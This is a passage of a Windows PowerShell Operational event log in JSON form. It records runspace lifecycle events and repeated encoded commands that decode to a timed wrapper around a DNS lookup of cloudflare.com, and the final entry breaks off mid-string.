      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAEQAbgBzAF0AOgA6AEcAZQB0AEgAbwBzAHQAQQBkAGQAcgBlAHMAcwBlAHMAKAAiAGMAbABvAHUAZABmAGwAYQByAGUALgBjAG8AbQAiACkACgAnAEAACgAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAD0AIAAyADUACgAkAHIAZQBzAHUAbAB0ACAAPQAgAEAAewAKACAAIAAgACAAUwB0AGQAbwB1AHQAIAA9ACAAIgAiAAoAIAAgACAAIABTAHQAZABlAHIAcgAgAD0AIAAiACIACgAgACAAIAAgAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAALQAxAAoAfQAKAHQAcgB5ACAAewAKACAAIAAgACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsAIAA9ACAAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACkACgAgACAAIAAgACQAagBvAGIAIAA9ACAAUwB0AGEAcgB0AC0ASgBvAGIAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgACQAcwBjAHIAaQBwAHQAQgBsAG8AYwBrAAoAIAAgACAAIABpAGYAIAAoAFcAYQBpAHQALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBUAGkAbQBlAG8AdQB0ACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAKQAgAHsACgAgACAAIAAgACAAIAAgACAAJABvAHUAdABwAHUAdAAgAD0AIABSAGUAYwBlAGkAdgBlAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAbwB1AHQAIAA9ACAAKAAkAG8AdQB0AHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAuAFQAcgBpAG0AKAApAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABqAG8AYgAuAFMAdABhAHQAZQAgAC0AZQBxACAAJwBGAGEAaQBsAGUAZAAnACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFMAdABkAGUAcgByACAAPQAgACQAagBvAGIALgBDAGgAaQBsAGQASgBvAGIAcwBbADAAXQAuAEoAbwBiAFMAdABhAHQAZQBJAG4AZgBvAC4AUgBlAGEAcwBvAG4ALgBNAGUAcwBzAGEAZwBlAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAAMQAKACAAIAAgACAAIAAgACAAIAB9ACAAZQBsAHMAZQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAwAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBDAG8AbQBtAGEAbgBkACAAdABpAG0AZQBkACAAbwB1AHQAIABvAG4AIAB0AGgAZQAgAHMAZQByAHYAZQByACAAYQBmAHQAZQByACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAIABzAGUAYwBvAG4AZABzAC4AIgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxADIANAAKACAAIAAgACAAfQAKAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBXAHIAYQBwAHAAZQByACAAUwBjAHIAaQBwAHQAIABFAHIAcgBvAHIAOgAgACQAKAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAKQAiAAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAfQAgAGYAaQBuAGEAbABsAHkAIAB7AAoAIAAgACAAIABpAGYAIAAoACQAagBvAGIAKQAgAHsACgAgACAAIAAgACAAIAAgACAAUwB0AG8AcAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUACgAgACAAIAAgACAAIAAgACAAUgBlAG0AbwB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAALQBGAG8AcgBjAGUACgAgACAAIAAgAH0ACgB9AAoAJAByAGUAcwB1AGwAdAAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4AIAAtAEMAbwBtAHAAcgBlAHMAcwAKAA=="
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAEQAbgBzAF0AOgA6AEcAZQB0AEgAbwBzAHQAQQBkAGQAcgBlAHMAcwBlAHMAKAAiAGMAbABvAHUAZABmAGwAYQByAGUALgBjAG8AbQAiACkACgAnAEAACgAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAD0AIAAyADUACgAkAHIAZQBzAHUAbAB0ACAAPQAgAEAAewAKACAAIAAgACAAUwB0AGQAbwB1AHQAIAA9ACAAIgAiAAoAIAAgACAAIABTAHQAZABlAHIAcgAgAD0AIAAiACIACgAgACAAIAAgAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAALQAxAAoAfQAKAHQAcgB5ACAAewAKACAAIAAgACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsAIAA9ACAAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACkACgAgACAAIAAgACQAagBvAGIAIAA9ACAAUwB0AGEAcgB0AC0ASgBvAGIAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgACQAcwBjAHIAaQBwAHQAQgBsAG8AYwBrAAoAIAAgACAAIABpAGYAIAAoAFcAYQBpAHQALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBUAGkAbQBlAG8AdQB0ACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAKQAgAHsACgAgACAAIAAgACAAIAAgACAAJABvAHUAdABwAHUAdAAgAD0AIABSAGUAYwBlAGkAdgBlAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAbwB1AHQAIAA9ACAAKAAkAG8AdQB0AHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAuAFQAcgBpAG0AKAApAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABqAG8AYgAuAFMAdABhAHQAZQAgAC0AZQBxACAAJwBGAGEAaQBsAGUAZAAnACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFMAdABkAGUAcgByACAAPQAgACQAagBvAGIALgBDAGgAaQBsAGQASgBvAGIAcwBbADAAXQAuAEoAbwBiAFMAdABhAHQAZQBJAG4AZgBvAC4AUgBlAGEAcwBvAG4ALgBNAGUAcwBzAGEAZwBlAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAAMQAKACAAIAAgACAAIAAgACAAIAB9ACAAZQBsAHMAZQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAwAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBDAG8AbQBtAGEAbgBkACAAdABpAG0AZQBkACAAbwB1AHQAIABvAG4AIAB0AGgAZQAgAHMAZQByAHYAZQByACAAYQBmAHQAZQByACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAIABzAGUAYwBvAG4AZABzAC4AIgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxADIANAAKACAAIAAgACAAfQAKAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBXAHIAYQBwAHAAZQByACAAUwBjAHIAaQBwAHQAIABFAHIAcgBvAHIAOgAgACQAKAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAKQAiAAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAfQAgAGYAaQBuAGEAbABsAHkAIAB7AAoAIAAgACAAIABpAGYAIAAoACQAagBvAGIAKQAgAHsACgAgACAAIAAgACAAIAAgACAAUwB0AG8AcAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUACgAgACAAIAAgACAAIAAgACAAUgBlAG0AbwB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAALQBGAG8AcgBjAGUACgAgACAAIAAgAH0ACgB9AAoAJAByAGUAcwB1AGwAdAAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4AIAAtAEMAbwBtAHAAcgBlAHMAcwAKAA=="
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAEQAbgBzAF0AOgA6AEcAZQB0AEgAbwBzAHQAQQBkAGQAcgBlAHMAcwBlAHMAKAAiAGMAbABvAHUAZABmAGwAYQByAGUALgBjAG8AbQAiACkACgAnAEAACgAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAD0AIAAyADUACgAkAHIAZQBzAHUAbAB0ACAAPQAgAEAAewAKACAAIAAgACAAUwB0AGQAbwB1AHQAIAA9ACAAIgAiAAoAIAAgACAAIABTAHQAZABlAHIAcgAgAD0AIAAiACIACgAgACAAIAAgAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAALQAxAAoAfQAKAHQAcgB5ACAAewAKACAAIAAgACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsAIAA9ACAAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACkACgAgACAAIAAgACQAagBvAGIAIAA9ACAAUwB0AGEAcgB0AC0ASgBvAGIAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgACQAcwBjAHIAaQBwAHQAQgBsAG8AYwBrAAoAIAAgACAAIABpAGYAIAAoAFcAYQBpAHQALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBUAGkAbQBlAG8AdQB0ACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAKQAgAHsACgAgACAAIAAgACAAIAAgACAAJABvAHUAdABwAHUAdAAgAD0AIABSAGUAYwBlAGkAdgBlAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAbwB1AHQAIAA9ACAAKAAkAG8AdQB0AHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAuAFQAcgBpAG0AKAApAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABqAG8AYgAuAFMAdABhAHQAZQAgAC0AZQBxACAAJwBGAGEAaQBsAGUAZAAnACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFMAdABkAGUAcgByACAAPQAgACQAagBvAGIALgBDAGgAaQBsAGQASgBvAGIAcwBbADAAXQAuAEoAbwBiAFMAdABhAHQAZQBJAG4AZgBvAC4AUgBlAGEAcwBvAG4ALgBNAGUAcwBzAGEAZwBlAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAAMQAKACAAIAAgACAAIAAgACAAIAB9ACAAZQBsAHMAZQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAwAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBDAG8AbQBtAGEAbgBkACAAdABpAG0AZQBkACAAbwB1AHQAIABvAG4AIAB0AGgAZQAgAHMAZQByAHYAZQByACAAYQBmAHQAZQByACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAIABzAGUAYwBvAG4AZABzAC4AIgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxADIANAAKACAAIAAgACAAfQAKAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBXAHIAYQBwAHAAZQByACAAUwBjAHIAaQBwAHQAIABFAHIAcgBvAHIAOgAgACQAKAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAKQAiAAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAfQAgAGYAaQBuAGEAbABsAHkAIAB7AAoAIAAgACAAIABpAGYAIAAoACQAagBvAGIAKQAgAHsACgAgACAAIAAgACAAIAAgACAAUwB0AG8AcAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUACgAgACAAIAAgACAAIAAgACAAUgBlAG0AbwB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAALQBGAG8AcgBjAGUACgAgACAAIAAgAH0ACgB9AAoAJAByAGUAcwB1AGwAdAAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4AIAAtAEMAbwBtAHAAcgBlAHMAcwAKAA=="
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8197,
      "details": "Runspace state changed to Closed"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8197,
      "details": "Runspace state changed to Closing"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 12039,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8196,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4104,
      "details": "[System.Net.Dns]::GetHostAddresses(\"cloudflare.com\")"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 12039,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8196,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8197,
      "details": "Runspace state changed to Opened"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 12039,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8196,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 53504,
      "details": "Windows PowerShell has started an IPC listening thread on process: 3556 in AppDomain: DefaultAppDomain."
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 12039,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8196,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAEQAbgBzAF0AOgA6AEcAZQB0AEgAbwBzAHQAQQBkAGQAcgBlAHMAcwBlAHMAKAAiAGMAbABvAHUAZABmAGwAYQByAGUALgBjAG8AbQAiACkACgAnAEAACgAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAD0AIAAyADUACgAkAHIAZQBzAHUAbAB0ACAAPQAgAEAAewAKACAAIAAgACAAUwB0AGQAbwB1AHQAIAA9ACAAIgAiAAoAIAAgACAAIABTAHQAZABlAHIAcgAgAD0AIAAiACIACgAgACAAIAAgAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAALQAxAAoAfQAKAHQAcgB5ACAAewAKACAAIAAgACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsAIAA9ACAAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACkACgAgACAAIAAgACQAagBvAGIAIAA9ACAAUwB0AGEAcgB0AC0ASgBvAGIAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgACQAcwBjAHIAaQBwAHQAQgBsAG8AYwBrAAoAIAAgACAAIABpAGYAIAAoAFcAYQBpAHQALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBUAGkAbQBlAG8AdQB0ACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAKQAgAHsACgAgACAAIAAgACAAIAAgACAAJABvAHUAdABwAHUAdAAgAD0AIABSAGUAYwBlAGkAdgBlAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAbwB1AHQAIAA9ACAAKAAkAG8AdQB0AHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAuAFQAcgBpAG0AKAApAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABqAG8AYgAuAFMAdABhAHQAZQAgAC0AZQBxACAAJwBGAGEAaQBsAGUAZAAnACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFMAdABkAGUAcgByACAAPQAgACQAagBvAGIALgBDAGgAaQBsAGQASgBvAGIAcwBbADAAXQAuAEoAbwBiAFMAdABhAHQAZQBJAG4AZgBvAC4AUgBlAGEAcwBvAG4ALgBNAGUAcwBzAGEAZwBlAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAAMQAKACAAIAAgACAAIAAgACAAIAB9ACAAZQBsAHMAZQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAwAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBDAG8AbQBtAGEAbgBkACAAdABpAG0AZQBkACAAbwB1AHQAIABvAG4AIAB0AGgAZQAgAHMAZQByAHYAZQByACAAYQBmAHQAZQByACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAIABzAGUAYwBvAG4AZABzAC4AIgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxADIANAAKACAAIAAgACAAfQAKAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBXAHIAYQBwAHAAZQByACAAUwBjAHIAaQBwAHQAIABFAHIAcgBvAHIAOgAgACQAKAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAKQAiAAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAfQAgAGYAaQBuAGEAbABsAHkAIAB7AAoAIAAgACAAIABpAGYAIAAoACQAagBvAGIAKQAgAHsACgAgACAAIAAgACAAIAAgACAAUwB0AG8AcAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUACgAgACAAIAAgACAAIAAgACAAUgBlAG0AbwB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAALQBGAG8AcgBjAGUACgAgACAAIAAgAH0ACgB9AAoAJAByAGUAcwB1AGwAdAAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4AIAAtAEMAbwBtAHAAcgBlAHMAcwAKAA=="
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 40961,
      "details": "PowerShell console is starting up"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8197,
      "details": "Runspace state changed to Opening"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8195,
      "details": "Opening RunspacePool"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8194,
      "details": "Creating RunspacePool object \r\n \t InstanceId 4d3e64d5-99a4-414e-8dc8-7578982a1897 \r\n \t MinRunspaces 1 \r\n \t MaxRunspaces 1"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8193,
      "details": "Creating Runspace object \r\n \t Instance Id: 0ba92e86-493d-4a7a-8dbc-0fa0a5333cf3"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAEQAbgBzAF0AOgA6AEcAZQB0AEgAbwBzAHQAQQBkAGQAcgBlAHMAcwBlAHMAKAAiAGMAbABvAHUAZABmAGwAYQByAGUALgBjAG8AbQAiACkACgAnAEAACgAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAD0AIAAyADUACgAkAHIAZQBzAHUAbAB0ACAAPQAgAEAAewAKACAAIAAgACAAUwB0AGQAbwB1AHQAIAA9ACAAIgAiAAoAIAAgACAAIABTAHQAZABlAHIAcgAgAD0AIAAiACIACgAgACAAIAAgAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAALQAxAAoAfQAKAHQAcgB5ACAAewAKACAAIAAgACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsAIAA9ACAAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACkACgAgACAAIAAgACQAagBvAGIAIAA9ACAAUwB0AGEAcgB0AC0ASgBvAGIAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgACQAcwBjAHIAaQBwAHQAQgBsAG8AYwBrAAoAIAAgACAAIABpAGYAIAAoAFcAYQBpAHQALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBUAGkAbQBlAG8AdQB0ACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAKQAgAHsACgAgACAAIAAgACAAIAAgACAAJABvAHUAdABwAHUAdAAgAD0AIABSAGUAYwBlAGkAdgBlAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAbwB1AHQAIAA9ACAAKAAkAG8AdQB0AHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAuAFQAcgBpAG0AKAApAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABqAG8AYgAuAFMAdABhAHQAZQAgAC0AZQBxACAAJwBGAGEAaQBsAGUAZAAnACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFMAdABkAGUAcgByACAAPQAgACQAagBvAGIALgBDAGgAaQBsAGQASgBvAGIAcwBbADAAXQAuAEoAbwBiAFMAdABhAHQAZQBJAG4AZgBvAC4AUgBlAGEAcwBvAG4ALgBNAGUAcwBzAGEAZwBlAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAAMQAKACAAIAAgACAAIAAgACAAIAB9ACAAZQBsAHMAZQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAwAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBDAG8AbQBtAGEAbgBkACAAdABpAG0AZQBkACAAbwB1AHQAIABvAG4AIAB0AGgAZQAgAHMAZQByAHYAZQByACAAYQBmAHQAZQByACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAIABzAGUAYwBvAG4AZABzAC4AIgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxADIANAAKACAAIAAgACAAfQAKAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBXAHIAYQBwAHAAZQByACAAUwBjAHIAaQBwAHQAIABFAHIAcgBvAHIAOgAgACQAKAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAKQAiAAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAfQAgAGYAaQBuAGEAbABsAHkAIAB7AAoAIAAgACAAIABpAGYAIAAoACQAagBvAGIAKQAgAHsACgAgACAAIAAgACAAIAAgACAAUwB0AG8AcAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUACgAgACAAI